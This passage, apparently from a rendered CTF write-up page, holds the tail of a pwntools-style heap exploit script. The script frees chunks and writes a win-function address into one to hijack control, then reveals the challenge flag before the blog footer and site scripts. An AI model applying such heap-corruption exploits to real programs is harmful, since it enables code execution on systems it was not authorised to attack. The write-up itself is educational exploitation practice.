+</span></span><span class="line"><span class="cl"><span class="n">malloc</span><span class="p">(</span><span class="mh">0x30</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;BBBB&#34;</span><span class="p">)</span> <span class="c1"># 1</span>
+</span></span><span class="line"><span class="cl"><span class="n">free</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">free</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">malloc</span><span class="p">(</span><span class="mh">0x10</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="n">WIN</span><span class="p">))</span> <span class="c1"># 2</span>
+</span></span><span class="line"><span class="cl"><span class="n">malloc</span><span class="p">(</span><span class="mh">0x58</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;13376741&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">view</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">r</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span></span></span></code></pre></div></div>
+<h3 id="flag-5">Flag</h3>
+<div class="details admonition question">
+        <div class="details-summary admonition-title">
+            <i class="icon fas fa-question-circle fa-fw" aria-hidden="true"></i>Click to show the flag<i class="details-icon fas fa-angle-right fa-fw" aria-hidden="true"></i>
+        </div>
+        <div class="details-content">
+            <div class="admonition-content"><code>flag{th3_0wr57_t0_d0_li57_ev3rrrrrrrrrrrrr}</code></div>
+        </div>
+    </div>
+</div><div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>Updated on 2025-11-12</span>
+            </div></div>
+        <div class="post-info-line">
+            <div class="post-info-md"></div>
+            <div class="post-info-share">
+                <span></span>
+            </div>
+        </div>
+    </div>
+
+    <div class="post-info-more">
+        <section class="post-tags"><i class="fas fa-tags fa-fw" aria-hidden="true"></i>&nbsp;<a href="/tags/ctf/">Ctf</a>,&nbsp;<a href="/tags/web-exploit/">Web Exploit</a>,&nbsp;<a href="/tags/reverse/">Reverse</a>,&nbsp;<a href="/tags/pwn/">Pwn</a></section>
+        <section>
+            <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav"><a href="/2025/11/ctf-idsecconf-2025-registration-challenge-writeup/" class="prev" rel="prev" title="CTF IDSECCONF 2025 Registration Challenge Writeup"><i class="fas fa-angle-left fa-fw" aria-hidden="true"></i>CTF IDSECCONF 2025 Registration Challenge Writeup</a>
+            <a href="/2025/12/htb-university-ctf-2025-writeup/" class="next" rel="next" title="HTB University CTF 2025 Writeup">HTB University CTF 2025 Writeup<i class="fas fa-angle-right fa-fw" aria-hidden="true"></i></a></div>
+</div>
+</article></div>
+            </main><footer class="footer">
+        <div class="footer-container"><div class="footer-line" itemscope itemtype="http://schema.org/CreativeWork"><i class="far fa-copyright fa-fw" aria-hidden="true"></i><span itemprop="copyrightYear">2023 - 2025</span></div>
+        </div>
+    </footer></div>
+
+        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="Back to Top">
+                <i class="fas fa-arrow-up fa-fw" aria-hidden="true"></i>
+            </a>
+        </div>
+
+        <div id="fixed-buttons-hidden"><a href="#" id="view-comments" class="fixed-button" title="View Comments">
+                <i class="fas fa-comment fa-fw" aria-hidden="true"></i>
+            </a>
+        </div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/lightgallery@2.5.0/css/lightgallery-bundle.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.16.21/dist/katex.min.css"><script src="https://cdn.jsdelivr.net/npm/lazysizes@5.3.2/lazysizes.min.js"></script><script src="https://cdn.jsdelivr.net/npm/lightgallery@2.5.0/lightgallery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/lightgallery@2.5.0/plugins/thumbnail/lg-thumbnail.min.js"></script><script src="https://cdn.jsdelivr.net/npm/lightgallery@2.5.0/plugins/zoom/lg-zoom.min.js"></script><script src="https://cdn.jsdelivr.net/npm/clipboard@2.0.11/dist/clipboard.min.js"></script><script src="https://cdn.jsdelivr.net/npm/katex@0.16.21/dist/katex.min.js"></script><script src="https://cdn.jsdelivr.net/npm/katex@0.16.21/dist/contrib/auto-render.min.js"></script><script src="https://cdn.jsdelivr.net/npm/katex@0.16.21/dist/contrib/copy-tex.min.js"></script><script src="https://cdn.jsdelivr.net/npm/katex@0.16.21/dist/contrib/mhchem.min.js"></script><script>window.config={"comment":{},"lightgallery":true,"math":{"delimiters":[{"display":true,"left":"$$","right":"$$"},{"display":true,"left":"\\[","right":"\\]"},{"display":true,"left":"\\begin{equation}","right":"\\end{equation}"},{"display":true,"left":"\\begin{equation*}","right":"\\end{equation*}"},{"display":true,"left":"\\begin{align}","right":"\\end{align}"},{"display":true,"left":"\\begin{align*}","right":"\\end{align*}"},{"display":true,"left":"\\begin{alignat}","right":"\\end{alignat}"},{"display":true,"left":"\\begin{alignat*}","right":"\\end{alignat*}"},{"display":true,"left":"\\begin{gather}","right":"\\end{gather}"},{"display":true,"left":"\\begin{CD}","right":"\\end{CD}"},{"display":false,"left":"$","right":"$"},{"display":false,"left":"\\(","right":"\\)"}],"strict":false}};</script><script src="/js/theme.min.js"></script><script>
+            var doNotTrack = false;
+            if ( false ) {
+                var dnt = (navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack);
+                var doNotTrack = (dnt == "1" || dnt == "yes");
+            }
+            if (!doNotTrack) {
+                window.dataLayer = window.dataLayer || [];
+                function gtag(){dataLayer.push(arguments);}
+                gtag('js', new Date());
+                gtag('config', 'G-LHYL3DDVEV');
+            }
+        </script><script src="https://www.googletagmanager.com/gtag/js?id=G-LHYL3DDVEV" async></script></body>
+</html>
